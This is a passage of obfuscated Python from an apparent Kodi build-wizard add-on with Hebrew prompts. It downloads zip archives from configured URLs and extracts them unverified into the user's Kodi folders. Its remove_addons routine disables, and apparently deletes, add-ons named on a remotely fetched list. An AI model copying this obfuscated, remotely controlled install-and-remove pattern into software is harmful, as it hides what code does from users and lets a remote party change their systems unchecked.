				OOOOOO000OO0O0OOO .append (O0OO0OOOO00OO0000 )#line:5120
				O0O0O0OOO0OO0O000 =O0OO0OOOO00OO0000 .replace ('\\','/').split ('/')#line:5121
				O000O0O0OOOOOO0OO .append ('(%s) %s'%(O0O0O0OOO0OO0O000 [len (O0O0O0OOO0OO0O000 )-2 ],O0O0O0OOO0OO0O000 [len (O0O0O0OOO0OO0O000 )-1 ]))#line:5122
	if KODIV >=16 :#line:5123
		OOO0000OOO0O0O0O0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000O0O0OOOOOO0OO )#line:5124
		if OOO0000OOO0O0O0O0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5125
		elif len (OOO0000OOO0O0O0O0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5126
		else :#line:5127
			for OOO00O00OO0OOOO0O in OOO0000OOO0O0O0O0 :wiz .purgeDb (OOOOOO000OO0O0OOO [OOO00O00OO0OOOO0O ])#line:5128
	else :#line:5129
		OOO0000OOO0O0O0O0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000O0O0OOOOOO0OO )#line:5130
		if OOO0000OOO0O0O0O0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5131
		else :wiz .purgeDb (OOOOOO000OO0O0OOO [OOO00O00OO0OOOO0O ])#line:5132
def fastupdatefirstbuild (O00OO0OO000OOO0O0 ):#line:5138
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5140
	if ENABLE =='Yes':#line:5141
		if not NOTIFY =='true':#line:5142
			OOOO0O0O000O00OOO =wiz .workingURL (NOTIFICATION )#line:5143
			if OOOO0O0O000O00OOO ==True :#line:5144
				OO0OO00OO0OO0OOOO ,O0OOOOOOO0O0OOO0O =wiz .splitNotify (NOTIFICATION )#line:5145
				if not OO0OO00OO0OO0OOOO ==False :#line:5147
					try :#line:5148
						OO0OO00OO0OO0OOOO =int (OO0OO00OO0OO0OOOO );O00OO0OO000OOO0O0 =int (O00OO0OO000OOO0O0 )#line:5149
						checkidupdate ()#line:5150
						wiz .setS ("notedismiss","true")#line:5151
						if OO0OO00OO0OO0OOOO ==O00OO0OO000OOO0O0 :#line:5152
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0OO00OO0OO0OOOO ),xbmc .LOGNOTICE )#line:5153
						elif OO0OO00OO0OO0OOOO >O00OO0OO000OOO0O0 :#line:5155
							wiz .log ("[Notifications] id: %s"%str (OO0OO00OO0OO0OOOO ),xbmc .LOGNOTICE )#line:5156
							wiz .setS ('noteid',str (OO0OO00OO0OO0OOOO ))#line:5157
							wiz .setS ("notedismiss","true")#line:5158
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5161
					except Exception as OOOO0O00O0000O0O0 :#line:5162
						wiz .log ("Error on Notifications Window: %s"%str (OOOO0O00O0000O0O0 ),xbmc .LOGERROR )#line:5163
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5165
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOO0O0O000O00OOO ),xbmc .LOGNOTICE )#line:5166
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5167
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5168
def checkidupdate ():#line:5174
				wiz .setS ("notedismiss","true")#line:5176
				O0OO0OOO0OO0OO000 =wiz .workingURL (NOTIFICATION )#line:5177
				O0000OOOOOOOOO00O =" Kodi Premium"#line:5179
				O000OOO0OOOO0O000 =wiz .checkBuild (O0000OOOOOOOOO00O ,'gui')#line:5180
				O0000000OOO0O0O0O =O0000OOOOOOOOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5181
				if not wiz .workingURL (O000OOO0OOOO0O000 )==True :return #line:5182
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5183
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0000OOOOOOOOO00O ),'','אנא המתן')#line:5184
				OOOO0O000O00O0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0000000OOO0O0O0O )#line:5185
				try :os .remove (OOOO0O000O00O0OO0 )#line:5186
				except :pass #line:5187
				logging .warning (O000OOO0OOOO0O000 )#line:5188
				if 'google'in O000OOO0OOOO0O000 :#line:5189
				   O00O0000O0OO0O0OO =googledrive_download (O000OOO0OOOO0O000 ,OOOO0O000O00O0OO0 ,DP ,wiz .checkBuild (O0000OOOOOOOOO00O ,'filesize'))#line:5190
				else :#line:5193
				  downloader .download (O000OOO0OOOO0O000 ,OOOO0O000O00O0OO0 ,DP )#line:5194
				xbmc .sleep (100 )#line:5195
				OOO00OO0O000O00O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOOOOOOOO00O )#line:5196
				DP .update (0 ,OOO00OO0O000O00O0 ,'','אנא המתן')#line:5197
				extract .all (OOOO0O000O00O0OO0 ,HOME ,DP ,title =OOO00OO0O000O00O0 )#line:5198
				DP .close ()#line:5199
				wiz .defaultSkin ()#line:5200
				wiz .lookandFeelData ('save')#line:5201
				if KODIV >=18 :#line:5202
					skindialogsettind18 ()#line:5203
				if INSTALLMETHOD ==1 :OO00O0O00000O000O =1 #line:5206
				elif INSTALLMETHOD ==2 :OO00O0O00000O000O =0 #line:5207
				else :DP .close ()#line:5208
def gaiaserenaddon ():#line:5210
  OOOOO0O0O0OO000OO =(ADDON .getSetting ("gaiaseren"))#line:5211
  OOOOOO000OOO0O0OO =(ADDON .getSetting ("auto_rd"))#line:5212
  if OOOOO0O0O0OO000OO =='true'and OOOOOO000OOO0O0OO =='true':#line:5213
    OO000O00O0O0OO0O0 =(NEWFASTUPDATE )#line:5214
    O0OOO00OOO000OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5215
    O00OOOO00000OO00O =xbmcgui .DialogProgress ()#line:5216
    O00OOOO00000OO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5217
    O00O000O0O00O0O0O =os .path .join (PACKAGES ,'isr.zip')#line:5218
    O0OO0000000OOOO0O =urllib2 .Request (OO000O00O0O0OO0O0 )#line:5219
    O0OO0O0O0OO00OO00 =urllib2 .urlopen (O0OO0000000OOOO0O )#line:5220
    O0OOO0OO00OOOOOOO =xbmcgui .DialogProgress ()#line:5222
    O0OOO0OO00OOOOOOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5223
    O0OOO0OO00OOOOOOO .update (0 )#line:5224
    O000OOOO000OOO0O0 =open (O00O000O0O00O0O0O ,'wb')#line:5226
    try :#line:5228
      O0O0OOO00O0O0O0O0 =O0OO0O0O0OO00OO00 .info ().getheader ('Content-Length').strip ()#line:5229
      OOO000OO00OO0OO0O =True #line:5230
    except AttributeError :#line:5231
          OOO000OO00OO0OO0O =False #line:5232
    if OOO000OO00OO0OO0O :#line:5234
          O0O0OOO00O0O0O0O0 =int (O0O0OOO00O0O0O0O0 )#line:5235
    OOOO0OOOOO00O00OO =0 #line:5237
    OOOOO0OO0O0OO0OOO =time .time ()#line:5238
    while True :#line:5239
          O0OOO00O000OOO0OO =O0OO0O0O0OO00OO00 .read (8192 )#line:5240
          if not O0OOO00O000OOO0OO :#line:5241
              sys .stdout .write ('\n')#line:5242
              break #line:5243
          OOOO0OOOOO00O00OO +=len (O0OOO00O000OOO0OO )#line:5245
          O000OOOO000OOO0O0 .write (O0OOO00O000OOO0OO )#line:5246
          if not OOO000OO00OO0OO0O :#line:5248
              O0O0OOO00O0O0O0O0 =OOOO0OOOOO00O00OO #line:5249
          if O0OOO0OO00OOOOOOO .iscanceled ():#line:5250
             O0OOO0OO00OOOOOOO .close ()#line:5251
             try :#line:5252
              os .remove (O00O000O0O00O0O0O )#line:5253
             except :#line:5254
              pass #line:5255
             break #line:5256
          OO00OOO0O00OO0000 =float (OOOO0OOOOO00O00OO )/O0O0OOO00O0O0O0O0 #line:5257
          OO00OOO0O00OO0000 =round (OO00OOO0O00OO0000 *100 ,2 )#line:5258
          OOO000O00O0O0O0OO =OOOO0OOOOO00O00OO /(1024 *1024 )#line:5259
          O0OO0OO0OOO0O00OO =O0O0OOO00O0O0O0O0 /(1024 *1024 )#line:5260
          O00O0000O0OO0OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO000O00O0O0O0OO ,'teal',O0OO0OO0OOO0O00OO )#line:5261
          if (time .time ()-OOOOO0OO0O0OO0OOO )>0 :#line:5262
            OOO0000O0O0O0O00O =OOOO0OOOOO00O00OO /(time .time ()-OOOOO0OO0O0OO0OOO )#line:5263
            OOO0000O0O0O0O00O =OOO0000O0O0O0O00O /1024 #line:5264
          else :#line:5265
           OOO0000O0O0O0O00O =0 #line:5266
          O00000OO00O0OO0OO ='KB'#line:5267
          if OOO0000O0O0O0O00O >=1024 :#line:5268
             OOO0000O0O0O0O00O =OOO0000O0O0O0O00O /1024 #line:5269
             O00000OO00O0OO0OO ='MB'#line:5270
          if OOO0000O0O0O0O00O >0 and not OO00OOO0O00OO0000 ==100 :#line:5271
              OO00O00OOOOOO0OOO =(O0O0OOO00O0O0O0O0 -OOOO0OOOOO00O00OO )/OOO0000O0O0O0O00O #line:5272
          else :#line:5273
              OO00O00OOOOOO0OOO =0 #line:5274
          O0000O000O000O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0000O0O0O0O00O ,O00000OO00O0OO0OO )#line:5275
          O0OOO0OO00OOOOOOO .update (int (OO00OOO0O00OO0000 ),O00O0000O0OO0OOOO ,O0000O000O000O0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5277
    OO0O0O0000000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5280
    O000OOOO000OOO0O0 .close ()#line:5283
    extract .all (O00O000O0O00O0O0O ,OO0O0O0000000OOO0 ,O0OOO0OO00OOOOOOO )#line:5284
    try :#line:5288
      os .remove (O00O000O0O00O0O0O )#line:5289
    except :#line:5290
      pass #line:5291
def iptvsimpldownpc ():#line:5292
    O00O0000O00OOO00O =(IPTVSIMPL18PC )#line:5294
    OO0O0000000OO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5295
    OO00000OOOOO0O0O0 =xbmcgui .DialogProgress ()#line:5296
    OO00000OOOOO0O0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5297
    O00OOO000OOO0O0OO =os .path .join (PACKAGES ,'isr.zip')#line:5298
    OO0O0000000O00OO0 =urllib2 .Request (O00O0000O00OOO00O )#line:5299
    OO000OOO00OOO000O =urllib2 .urlopen (OO0O0000000O00OO0 )#line:5300
    OOOO0000O00OOO000 =xbmcgui .DialogProgress ()#line:5302
    OOOO0000O00OOO000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5303
    OOOO0000O00OOO000 .update (0 )#line:5304
    OO0000O0O0O0OO000 =open (O00OOO000OOO0O0OO ,'wb')#line:5306
    try :#line:5308
      OO0O0O00O00OOOO00 =OO000OOO00OOO000O .info ().getheader ('Content-Length').strip ()#line:5309
      O000OOO0OOOOOOO0O =True #line:5310
    except AttributeError :#line:5311
          O000OOO0OOOOOOO0O =False #line:5312
    if O000OOO0OOOOOOO0O :#line:5314
          OO0O0O00O00OOOO00 =int (OO0O0O00O00OOOO00 )#line:5315
    OOOO00OOOO00OO000 =0 #line:5317
    O0O00O0000OOOOOO0 =time .time ()#line:5318
    while True :#line:5319
          O0000000OO000O0OO =OO000OOO00OOO000O .read (8192 )#line:5320
          if not O0000000OO000O0OO :#line:5321
              sys .stdout .write ('\n')#line:5322
              break #line:5323
          OOOO00OOOO00OO000 +=len (O0000000OO000O0OO )#line:5325
          OO0000O0O0O0OO000 .write (O0000000OO000O0OO )#line:5326
          if not O000OOO0OOOOOOO0O :#line:5328
              OO0O0O00O00OOOO00 =OOOO00OOOO00OO000 #line:5329
          if OOOO0000O00OOO000 .iscanceled ():#line:5330
             OOOO0000O00OOO000 .close ()#line:5331
             try :#line:5332
              os .remove (O00OOO000OOO0O0OO )#line:5333
             except :#line:5334
              pass #line:5335
             break #line:5336
          O0OO0O0OOOO0OO000 =float (OOOO00OOOO00OO000 )/OO0O0O00O00OOOO00 #line:5337
          O0OO0O0OOOO0OO000 =round (O0OO0O0OOOO0OO000 *100 ,2 )#line:5338
          OO0O00O0OO000000O =OOOO00OOOO00OO000 /(1024 *1024 )#line:5339
          O0OOOOOO0O00O00OO =OO0O0O00O00OOOO00 /(1024 *1024 )#line:5340
          OOOO000OOO0O000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O00O0OO000000O ,'teal',O0OOOOOO0O00O00OO )#line:5341
          if (time .time ()-O0O00O0000OOOOOO0 )>0 :#line:5342
            OO00OOOOO0O0OO0OO =OOOO00OOOO00OO000 /(time .time ()-O0O00O0000OOOOOO0 )#line:5343
            OO00OOOOO0O0OO0OO =OO00OOOOO0O0OO0OO /1024 #line:5344
          else :#line:5345
           OO00OOOOO0O0OO0OO =0 #line:5346
          O00OOO0O0O00OOO0O ='KB'#line:5347
          if OO00OOOOO0O0OO0OO >=1024 :#line:5348
             OO00OOOOO0O0OO0OO =OO00OOOOO0O0OO0OO /1024 #line:5349
             O00OOO0O0O00OOO0O ='MB'#line:5350
          if OO00OOOOO0O0OO0OO >0 and not O0OO0O0OOOO0OO000 ==100 :#line:5351
              OOOOO00OO00OOO00O =(OO0O0O00O00OOOO00 -OOOO00OOOO00OO000 )/OO00OOOOO0O0OO0OO #line:5352
          else :#line:5353
              OOOOO00OO00OOO00O =0 #line:5354
          O000O00OO000000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00OOOOO0O0OO0OO ,O00OOO0O0O00OOO0O )#line:5355
          OOOO0000O00OOO000 .update (int (O0OO0O0OOOO0OO000 ),OOOO000OOO0O000OO ,O000O00OO000000O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5357
    OOOOOO0OOO00OO00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5360
    OO0000O0O0O0OO000 .close ()#line:5363
    extract .all (O00OOO000OOO0O0OO ,OOOOOO0OOO00OO00O ,OOOO0000O00OOO000 )#line:5364
    try :#line:5368
      os .remove (O00OOO000OOO0O0OO )#line:5369
    except :#line:5370
      pass #line:5371
def iptvsimpldown ():#line:5372
    O0OOOOOOO00OOO000 =(IPTV18 )#line:5374
    O00OOOOO00OOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5375
    O0O00OO0O0O0O00OO =xbmcgui .DialogProgress ()#line:5376
    O0O00OO0O0O0O00OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5377
    OOOO000000O0O0O00 =os .path .join (PACKAGES ,'isr.zip')#line:5378
    OOO00OO00O0000O00 =urllib2 .Request (O0OOOOOOO00OOO000 )#line:5379
    O0OOOOOOOOO0OOOOO =urllib2 .urlopen (OOO00OO00O0000O00 )#line:5380
    OO00OO000OOOOO0OO =xbmcgui .DialogProgress ()#line:5382
    OO00OO000OOOOO0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5383
    OO00OO000OOOOO0OO .update (0 )#line:5384
    O0000O0O0OOOOOO0O =open (OOOO000000O0O0O00 ,'wb')#line:5386
    try :#line:5388
      OOOOOOO000O00OO00 =O0OOOOOOOOO0OOOOO .info ().getheader ('Content-Length').strip ()#line:5389
      O0O00OOO00OOOO0O0 =True #line:5390
    except AttributeError :#line:5391
          O0O00OOO00OOOO0O0 =False #line:5392
    if O0O00OOO00OOOO0O0 :#line:5394
          OOOOOOO000O00OO00 =int (OOOOOOO000O00OO00 )#line:5395
    OOO000OOOO000O0OO =0 #line:5397
    OO0OO000OOO000OOO =time .time ()#line:5398
    while True :#line:5399
          O000O00O0OO0O00OO =O0OOOOOOOOO0OOOOO .read (8192 )#line:5400
          if not O000O00O0OO0O00OO :#line:5401
              sys .stdout .write ('\n')#line:5402
              break #line:5403
          OOO000OOOO000O0OO +=len (O000O00O0OO0O00OO )#line:5405
          O0000O0O0OOOOOO0O .write (O000O00O0OO0O00OO )#line:5406
          if not O0O00OOO00OOOO0O0 :#line:5408
              OOOOOOO000O00OO00 =OOO000OOOO000O0OO #line:5409
          if OO00OO000OOOOO0OO .iscanceled ():#line:5410
             OO00OO000OOOOO0OO .close ()#line:5411
             try :#line:5412
              os .remove (OOOO000000O0O0O00 )#line:5413
             except :#line:5414
              pass #line:5415
             break #line:5416
          O0OOOO00O0OO00000 =float (OOO000OOOO000O0OO )/OOOOOOO000O00OO00 #line:5417
          O0OOOO00O0OO00000 =round (O0OOOO00O0OO00000 *100 ,2 )#line:5418
          OO000000OO0O00O00 =OOO000OOOO000O0OO /(1024 *1024 )#line:5419
          OO0OOO0OOOO00OO00 =OOOOOOO000O00OO00 /(1024 *1024 )#line:5420
          O0000O00OO0OO0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000000OO0O00O00 ,'teal',OO0OOO0OOOO00OO00 )#line:5421
          if (time .time ()-OO0OO000OOO000OOO )>0 :#line:5422
            OO0O0O000O0OOOO00 =OOO000OOOO000O0OO /(time .time ()-OO0OO000OOO000OOO )#line:5423
            OO0O0O000O0OOOO00 =OO0O0O000O0OOOO00 /1024 #line:5424
          else :#line:5425
           OO0O0O000O0OOOO00 =0 #line:5426
          OOO000000OO0OO0OO ='KB'#line:5427
          if OO0O0O000O0OOOO00 >=1024 :#line:5428
             OO0O0O000O0OOOO00 =OO0O0O000O0OOOO00 /1024 #line:5429
             OOO000000OO0OO0OO ='MB'#line:5430
          if OO0O0O000O0OOOO00 >0 and not O0OOOO00O0OO00000 ==100 :#line:5431
              O0000OOO0000OO0OO =(OOOOOOO000O00OO00 -OOO000OOOO000O0OO )/OO0O0O000O0OOOO00 #line:5432
          else :#line:5433
              O0000OOO0000OO0OO =0 #line:5434
          OO0OOOOOO00OO0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0O000O0OOOO00 ,OOO000000OO0OO0OO )#line:5435
          OO00OO000OOOOO0OO .update (int (O0OOOO00O0OO00000 ),O0000O00OO0OO0O00 ,OO0OOOOOO00OO0OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5437
    O00O00OO00OOOO0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5440
    O0000O0O0OOOOOO0O .close ()#line:5443
    extract .all (OOOO000000O0O0O00 ,O00O00OO00OOOO0O0 ,OO00OO000OOOOO0OO )#line:5444
    try :#line:5448
      os .remove (OOOO000000O0O0O00 )#line:5449
    except :#line:5450
      pass #line:5451
def testnotify ():#line:5452
	O0O00O00O00000O00 =wiz .workingURL (NOTIFICATION )#line:5453
	if O0O00O00O00000O00 ==True :#line:5454
		try :#line:5455
			O0O0OOOO00O000O00 ,OO0OOOOO00OOOOO00 =wiz .splitNotify (NOTIFICATION )#line:5456
			if O0O0OOOO00O000O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5457
			if STARTP2 ()=='ok':#line:5458
				notify .notification (OO0OOOOO00OOOOO00 ,True )#line:5459
		except Exception as OO00000OOOOOOOO0O :#line:5460
			wiz .log ("Error on Notifications Window: %s"%str (OO00000OOOOOOOO0O ),xbmc .LOGERROR )#line:5461
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5462
def testnotify2 ():#line:5463
	O0000O000OOO000O0 =wiz .workingURL (NOTIFICATION2 )#line:5464
	if O0000O000OOO000O0 ==True :#line:5465
		try :#line:5466
			O000OOO0000OO000O ,O0OO00OOOO000O000 =wiz .splitNotify (NOTIFICATION2 )#line:5467
			if O000OOO0000OO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5468
			if STARTP2 ()=='ok':#line:5469
				notify .notification2 (O0OO00OOOO000O000 ,True )#line:5470
		except Exception as OOOOO00000OOOO0O0 :#line:5471
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO00000OOOO0O0 ),xbmc .LOGERROR )#line:5472
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5473
def testnotify3 ():#line:5474
	O0O0O00OO0OO0000O =wiz .workingURL (NOTIFICATION3 )#line:5475
	if O0O0O00OO0OO0000O ==True :#line:5476
		try :#line:5477
			O00000O00O0OO0O0O ,O00O0000O0OOO0O0O =wiz .splitNotify (NOTIFICATION3 )#line:5478
			if O00000O00O0OO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5479
			if STARTP2 ()=='ok':#line:5480
				notify .notification3 (O00O0000O0OOO0O0O ,True )#line:5481
		except Exception as O0000OOO0OO0O00O0 :#line:5482
			wiz .log ("Error on Notifications Window: %s"%str (O0000OOO0OO0O00O0 ),xbmc .LOGERROR )#line:5483
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5484
def servicemanual ():#line:5485
	OO0O0O0OOO0OO0O0O =wiz .workingURL (HELPINFO )#line:5486
	if OO0O0O0OOO0OO0O0O ==True :#line:5487
		try :#line:5488
			O0O0O0O000OO0OO0O ,O000O0OO000O00000 =wiz .splitNotify (HELPINFO )#line:5489
			if O0O0O0O000OO0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5490
			notify .helpinfo (O000O0OO000O00000 ,True )#line:5491
		except Exception as OOO00OO0OOOO0O00O :#line:5492
			wiz .log ("Error on Notifications Window: %s"%str (OOO00OO0OOOO0O00O ),xbmc .LOGERROR )#line:5493
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5494
def testupdate ():#line:5496
	if BUILDNAME =="":#line:5497
		notify .updateWindow ()#line:5498
	else :#line:5499
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5500
def testfirst ():#line:5502
	notify .firstRun ()#line:5503
def testfirstRun ():#line:5505
	notify .firstRunSettings ()#line:5506
def fastinstall ():#line:5509
	notify .firstRuninstall ()#line:5510
def addDir (OOO0000O0O0O0OO00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5517
	OO00O0OOO0OOOO000 =sys .argv [0 ]#line:5518
	if not mode ==None :OO00O0OOO0OOOO000 +="?mode=%s"%urllib .quote_plus (mode )#line:5519
	if not name ==None :OO00O0OOO0OOOO000 +="&name="+urllib .quote_plus (name )#line:5520
	if not url ==None :OO00O0OOO0OOOO000 +="&url="+urllib .quote_plus (url )#line:5521
	O0O000OO00000OO00 =True #line:5522
	if themeit :OOO0000O0O0O0OO00 =themeit %OOO0000O0O0O0OO00 #line:5523
	OOO00O00OOO00O0O0 =xbmcgui .ListItem (OOO0000O0O0O0OO00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5524
	OOO00O00OOO00O0O0 .setInfo (type ="Video",infoLabels ={"Title":OOO0000O0O0O0OO00 ,"Plot":description })#line:5525
	OOO00O00OOO00O0O0 .setProperty ("Fanart_Image",fanart )#line:5526
	if not menu ==None :OOO00O00OOO00O0O0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5527
	O0O000OO00000OO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00O0OOO0OOOO000 ,listitem =OOO00O00OOO00O0O0 ,isFolder =True )#line:5528
	return O0O000OO00000OO00 #line:5529
def addFile (O0OO0000O0OO0O0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5531
	O0O000O00O000OOOO =sys .argv [0 ]#line:5532
	if not mode ==None :O0O000O00O000OOOO +="?mode=%s"%urllib .quote_plus (mode )#line:5533
	if not name ==None :O0O000O00O000OOOO +="&name="+urllib .quote_plus (name )#line:5534
	if not url ==None :O0O000O00O000OOOO +="&url="+urllib .quote_plus (url )#line:5535
	OO00OO000OO00OO00 =True #line:5536
	if themeit :O0OO0000O0OO0O0O0 =themeit %O0OO0000O0OO0O0O0 #line:5537
	OOOO00O0O00OO0000 =xbmcgui .ListItem (O0OO0000O0OO0O0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5538
	OOOO00O0O00OO0000 .setInfo (type ="Video",infoLabels ={"Title":O0OO0000O0OO0O0O0 ,"Plot":description })#line:5539
	OOOO00O0O00OO0000 .setProperty ("Fanart_Image",fanart )#line:5540
	if not menu ==None :OOOO00O0O00OO0000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5541
	OO00OO000OO00OO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O000O00O000OOOO ,listitem =OOOO00O0O00OO0000 ,isFolder =False )#line:5542
	return OO00OO000OO00OO00 #line:5543
def get_params ():#line:5545
	OOOO0OOOOO0OOOO00 =[]#line:5546
	O00OO0O00OOOOOOO0 =sys .argv [2 ]#line:5547
	if len (O00OO0O00OOOOOOO0 )>=2 :#line:5548
		O000O00O000O000O0 =sys .argv [2 ]#line:5549
		O00O00OO0OOO00OO0 =O000O00O000O000O0 .replace ('?','')#line:5550
		if (O000O00O000O000O0 [len (O000O00O000O000O0 )-1 ]=='/'):#line:5551
			O000O00O000O000O0 =O000O00O000O000O0 [0 :len (O000O00O000O000O0 )-2 ]#line:5552
		O00O0O0OOO0OO0OO0 =O00O00OO0OOO00OO0 .split ('&')#line:5553
		OOOO0OOOOO0OOOO00 ={}#line:5554
		for OO000O0OO0O0OO00O in range (len (O00O0O0OOO0OO0OO0 )):#line:5555
			OOO00O00OOOO0OOO0 ={}#line:5556
			OOO00O00OOOO0OOO0 =O00O0O0OOO0OO0OO0 [OO000O0OO0O0OO00O ].split ('=')#line:5557
			if (len (OOO00O00OOOO0OOO0 ))==2 :#line:5558
				OOOO0OOOOO0OOOO00 [OOO00O00OOOO0OOO0 [0 ]]=OOO00O00OOOO0OOO0 [1 ]#line:5559
		return OOOO0OOOOO0OOOO00 #line:5561
def remove_addons ():#line:5563
	try :#line:5564
			import json #line:5565
			O0OOO000000O0OO0O =urllib2 .urlopen (remove_url ).readlines ()#line:5566
			for O00OOOO000OOOOO00 in O0OOO000000O0OO0O :#line:5567
				O0O0O0OO00OOOOOO0 =O00OOOO000OOOOO00 .split (':')[1 ].strip ()#line:5569
				OOOOOO00OO0OO0OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0O0O0OO00OOOOOO0 ,'false')#line:5570
				O0OO0000O0OOOOO00 =xbmc .executeJSONRPC (OOOOOO00OO0OO0OO0 )#line:5571
				OO000OO0OOO00OO0O =json .loads (O0OO0000O0OOOOO00 )#line:5572
				OOOOO00O000O0000O =os .path .join (addons_folder ,O0O0O0OO00OOOOOO0 )#line:5574
				if os .path .exists (OOOOO00O000O0000O ):#line:5576
					for O000OO0O00OOO0OO0 ,O00O00000O0O000O0 ,O0OOO00OOO0OOOO0O in os .walk (OOOOO00O000O0000O ):#line:5577
